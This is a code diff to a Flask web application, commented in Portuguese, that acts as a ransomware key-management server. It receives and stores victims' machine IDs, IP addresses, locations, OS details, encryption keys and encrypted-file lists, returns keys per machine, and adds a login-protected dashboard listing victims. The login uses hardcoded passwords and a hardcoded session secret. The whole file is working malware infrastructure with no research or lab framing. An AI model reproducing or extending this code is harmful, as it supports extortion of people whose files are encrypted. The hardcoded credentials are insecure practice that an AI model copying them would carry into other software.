@@ -1,10 +1,54 @@
-from flask import Flask, redirect, request, jsonify, render_template
+from flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify
 import sqlite3
 import datetime
 import os
 
-# Criando a aplicação Flask
 app = Flask(__name__)
+app.secret_key = 'sua_chave_secreta_aqui'  # Chave secreta para sessões
+
+# Usuários de exemplo
+users = {
+    "admin": "password123",
+    "user1": "mypassword"
+}
+
+# Rota para a página de login
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+        
+        # Validação do usuário
+        if username in users and users[username] == password:
+            session['username'] = username  # Armazena o usuário na sessão
+            flash('Login realizado com sucesso!', 'success')
+            return redirect(url_for('index'))
+        else:
+            flash('Nome de usuário ou senha incorretos!', 'danger')
+            return redirect(url_for('login'))
+    
+    return render_template('login.html')
+
+# Página protegida
+@app.route('/')
+def index():
+    if 'username' in session:
+        with sqlite3.connect("ransomware.db") as conn:
+            cursor = conn.cursor()
+            cursor.execute("SELECT machine_id, machine_name, ip_address, public_ip, os_info, encryption_key, location, execution_time FROM keys")
+            rows = cursor.fetchall()
+        return render_template('index.html', user=session['username'], rows=rows)
+    else:
+        flash('Por favor, faça login para acessar essa página.', 'warning')
+        return redirect(url_for('login'))
+
+# Rota para logout
+@app.route('/logout')
+def logout():
+    session.pop('username', None)  # Remove o usuário da sessão
+    flash('Você foi desconectado.', 'info')
+    return redirect(url_for('login'))
 
 # Configuração do banco de dados SQLite
 def init_db():
@@ -26,8 +70,6 @@ def init_db():
         conn.commit()
 
 # Rota que permite adicionar uma nova chave ao banco de dados via uma requisição POST.
-# Ela espera um JSON contendo 'machine_id' e 'encryption_key' e armazena essas informações
-# na tabela 'keys'
 @app.route('/api/keys/add', methods=['POST'])
 def add_key():
     data = request.json
@@ -38,8 +80,8 @@ def add_key():
     public_ip = data.get('public_ip', 'Desconhecido')
     os_info = data.get('os_info', 'Desconhecido')
     location = data.get('location', 'Desconhecido')
-    file_names = data.get('file_names', '{}') # Recebe o arquivo JSON com os nomes dos arquivos.
-    execution_time = datetime.datetime.now() # Captura em tempo real
+    file_names = data.get('file_names', '{}')  # Recebe o arquivo JSON com os nomes dos arquivos.
+    execution_time = datetime.datetime.now()  # Captura em tempo real
 
     # Salvar o arquivo JSON no servidor
     json_dir = "json_files"
@@ -55,11 +97,7 @@ def add_key():
 
     return jsonify({"message": "Key stored successfully"}), 200
 
-'''
-A rota /api/keys/<machine_id> permite obter a chave de criptografia associada a um machine_id
-via uma requisição GET. Se a chave for encontrada, ela é retornada em formato JSON. Caso contrário,
-uma mensagem de "Key not found" é retornada com o status 404.
-'''
+# Rota para obter a chave de criptografia associada a um machine_id
 @app.route('/api/keys/<machine_id>', methods=['GET'])
 def get_key(machine_id):
     with sqlite3.connect("ransomware.db") as conn:
@@ -78,9 +116,9 @@ def get_key(machine_id):
         else:
             return jsonify({"encryption_key": row[0], "message": "Arquivo de nomes não encontrado"})
     else:
-        return jsonify({"message": "Chave não encotrada"}), 404
+        return jsonify({"message": "Chave não encontrada"}), 404
 
-# Rota para exclusão no servidor.
+# Rota para exclusão no servidor
 @app.route('/delete/<machine_id>', methods=['POST'])
 def delete_key(machine_id):
     try:
@@ -101,16 +139,7 @@ def delete_key(machine_id):
     except Exception as e:
         print(f"Erro ao excluir a chave: {e}")
         return "Erro ao excluir a chave", 500
-    
-@app.route('/')
-def index():
-    with sqlite3.connect("ransomware.db") as conn:
-        cursor = conn.cursor()
-        cursor.execute("SELECT machine_id, machine_name, ip_address, public_ip, os_info, encryption_key, location, execution_time FROM keys")
-        rows = cursor.fetchall()
-
-    return render_template('index.html', rows=rows)
 
 if __name__ == '__main__':
     init_db()
-    app.run(host='10.0.2.15', port=5000)
+    app.run(host='192.168.74.123', port=5000)
